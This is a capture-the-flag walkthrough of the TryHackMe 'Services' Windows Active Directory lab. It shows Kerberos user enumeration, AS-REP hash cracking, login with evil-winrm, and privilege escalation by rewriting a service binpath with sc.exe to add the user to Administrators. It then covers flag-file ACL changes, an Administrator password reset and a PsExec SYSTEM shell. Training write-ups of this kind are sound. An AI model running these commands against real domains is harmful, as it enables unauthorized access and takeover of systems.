# Services

[TryHackMe room link](https://tryhackme.com/room/services)

# Informations about the room

> Meet the team!
Whenever you are ready, click on the Start Machine button to fire up the Virtual Machine. Please allow 3-5 minutes for the VM to fully start.

# Open ports

53/tcp    open  domain        syn-ack Simple DNS Plus

80/tcp    open  http          syn-ack Microsoft IIS httpd 10.0

88/tcp    open  kerberos-sec  syn-ack Microsoft Windows Kerberos (server time: 2023-04-21 19:39:20Z)

135/tcp   open  msrpc         syn-ack Microsoft Windows RPC

139/tcp   open  netbios-ssn   syn-ack Microsoft Windows netbios-ssn

389/tcp   open  ldap          syn-ack Microsoft Windows Active Directory LDAP (Domain: services.local0., Site: Default-First-Site-Name)

445/tcp   open  microsoft-ds? syn-ack

464/tcp   open  kpasswd5?     syn-ack

593/tcp   open  ncacn_http    syn-ack Microsoft Windows RPC over HTTP 1.0

636/tcp   open  tcpwrapped    syn-ack

3268/tcp  open  ldap          syn-ack Microsoft Windows Active Directory LDAP (Domain: services.local0., Site: Default-First-Site-Name)

3269/tcp  open  tcpwrapped    syn-ack

3389/tcp  open  ms-wbt-server syn-ack Microsoft Terminal Services

5985/tcp  open  http          syn-ack Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)

7680/tcp  open  pando-pub?    syn-ack

9389/tcp  open  mc-nmf        syn-ack .NET Message Framing

47001/tcp open  http          syn-ack Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)

49664/tcp open  msrpc         syn-ack Microsoft Windows RPC

49665/tcp open  msrpc         syn-ack Microsoft Windows RPC

49666/tcp open  msrpc         syn-ack Microsoft Windows RPC

49667/tcp open  msrpc         syn-ack Microsoft Windows RPC

49668/tcp open  msrpc         syn-ack Microsoft Windows RPC

49674/tcp open  msrpc         syn-ack Microsoft Windows RPC

49675/tcp open  ncacn_http    syn-ack Microsoft Windows RPC over HTTP 1.0

49676/tcp open  msrpc         syn-ack Microsoft Windows RPC

49678/tcp open  msrpc         syn-ack Microsoft Windows RPC

49679/tcp open  msrpc         syn-ack Microsoft Windows RPC

49696/tcp open  msrpc         syn-ack Microsoft Windows RPC

49706/tcp open  msrpc         syn-ack Microsoft Windows RPC

# Enumeration

This is a Windows machine that seems to be AD domain joined, you need to add the domain to the `etc/hosts` file

In the `http://services.local/about.html` page we can see possible usernames

We can try to enumerate users with `kerbrute`

```console
❯ ./kerbrute_linux_amd64 userenum --dc 10.10.66.49 -d services.local users.txt -o valid_users.txt                                      
                                                                                                                                       
    __             __               __                                                                                                 
   / /_____  _____/ /_  _______  __/ /____                                                                                             
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                         

Version: v1.0.3 (9dad6e1) - 04/21/23 - Ronnie Flathers @ropnop

2023/04/21 23:35:55 >  Using KDC(s):
2023/04/21 23:35:55 >   10.10.66.49:88

2023/04/21 23:35:55 >  [+] VALID USERNAME:       j.doe@services.local
2023/04/21 23:35:55 >  [+] VALID USERNAME:       w.masters@services.local
2023/04/21 23:35:55 >  [+] VALID USERNAME:       j.larusso@services.local
2023/04/21 23:35:55 >  [+] VALID USERNAME:       j.rock@services.local
2023/04/21 23:35:55 >  Done! Tested 12 usernames (4 valid) in 0.157 seconds

```

With kerbrute i did not manage to get preauth hashes so i used this Metasploit module too `auxiliary/gather/kerberos_enumusers`: 

```console
[*] Using domain: SERVICES.LOCAL - 10.10.66.49:88       ...
[*] 10.10.66.49 - User: "joanne.doe" user not found
[+] 10.10.66.49 - User: "j.doe" is present
[!] No active DB -- Credential data will not be saved!
[*] 10.10.66.49 - User: "joanne.d" user not found
[*] 10.10.66.49 - User: "jack.rock" user not found
[+] 10.10.66.49 - User: "j.rock" does not require preauthentication. Hash: REDACTED
[*] 10.10.66.49 - User: "jack.r" user not found
[*] 10.10.66.49 - User: "will.masters" user not found
[+] 10.10.66.49 - User: "w.masters" is present
[*] 10.10.66.49 - User: "will.m" user not found
[*] 10.10.66.49 - User: "johnny.larusso" user not found
[+] 10.10.66.49 - User: "j.larusso" is present
[*] 10.10.66.49 - User: "johnny.l" user not found
[*] Auxiliary module execution completed
```

We can now crack the hash with Hashcat or John or with whatever you like:

```console
hashcat hash.txt /usr/share/wordlists/rockyou.txt
```
```console
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

To connect to the machine you can use RDP or `Evil-WinRM`

`evil-winrm -i 10.10.66.49 -u j.rock -p REDACTED`

# Privilege escalation

If we type `net user j.rock` we can see that we are in the Server Operators group

To get Administrator permissions we can change the binpath of certain services

To find those services type `services` in the WinRM shell
```console
*Evil-WinRM* PS C:\Users\j.rock\Documents> services                                                                                                          
                                                                                                                                                             
Path                                                                           Privileges Service                                                            
----                                                                           ---------- -------                                                            
C:\Windows\ADWS\Microsoft.ActiveDirectory.WebServices.exe                            True ADWS                                                               
"C:\Program Files\Amazon\SSM\amazon-ssm-agent.exe"                                   True AmazonSSMAgent                                                     
"C:\Program Files\Amazon\XenTools\LiteAgent.exe"                                     True AWSLiteAgent                                                       
"C:\Program Files\Amazon\cfn-bootstrap\winhup.exe"                                   True cfn-hup                                                            
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\SMSvcHost.exe                        True NetTcpPortSharing                                                  
C:\Windows\SysWow64\perfhost.exe                                                     True PerfHost                                                           
"C:\Program Files\Windows Defender Advanced Threat Protection\MsSense.exe"          False Sense                                                              
C:\Windows\servicing\TrustedInstaller.exe                                           False TrustedInstaller                                                   
"C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.2302.7-0\NisSrv.exe"        True WdNisSvc                                                           
"C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.2302.7-0\MsMpEng.exe"       True WinDefend                                                          
"C:\Program Files\Windows Media Player\wmpnetwk.exe"                                False WMPNetworkSvc 
```

We can use i think almost all of those services, i am gonna use the AD WebServices 

When you change the binpath you can specify a reverse shell that you uploaded or just add `j.rock` to the administrators group:
```console
*Evil-WinRM* PS C:\Users\j.rock\Documents> sc.exe config adws binpath="net localgroup administrators j.rock /add"
```

Now stop and restart the service
```
*Evil-WinRM* PS C:\Users\j.rock\Documents> sc.exe stop adws 

*Evil-WinRM* PS C:\Users\j.rock\Documents> sc.exe start adws 
```

Exit the shell and log in again

Now you should be in the administrators group

```console
*Evil-WinRM* PS C:\Users\j.rock\Documents> net user j.rock
User name                    j.rock
Full Name                    Jack Rock
Comment                      IT Support 
User's comment
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never

Password last set            2/15/2023 5:42:32 AM
Password expires             Never
Password changeable          2/16/2023 5:42:32 AM
Password required            No
User may change password     Yes

Workstations allowed         All
Logon script
User profile
Home directory
Last logon                   Never

Logon hours allowed          All

Local Group Memberships      *Administrators       *Remote Management Use
                             *Server Operators
Global Group memberships     *Domain Users
The command completed successfully.
```

But we still cannot cat the root flag

Since we are in the Admins group you can change the permissions of the `root.txt` and own the file: 
```
*Evil-WinRM* PS C:\Users\j.rock\Desktop> cacls root.txt /e /p j.rock:f
```

Or change the Administrator account password and then log in and cat the flag:
```
*Evil-WinRM* PS C:\Users\j.rock\Desktop> net user administrator password123$
```

Or the last thing that you can do is use [Psexec](https://learn.microsoft.com/en-us/sysinternals/downloads/psexec) in a RDP session to spawn a shell as SYSTEM 

```
TYPE THIS IN A ELEVATED COMMAND PROMPT OR POWERSHELL SESSION

.\PsExec.exe -i -s cmd.exe 
```
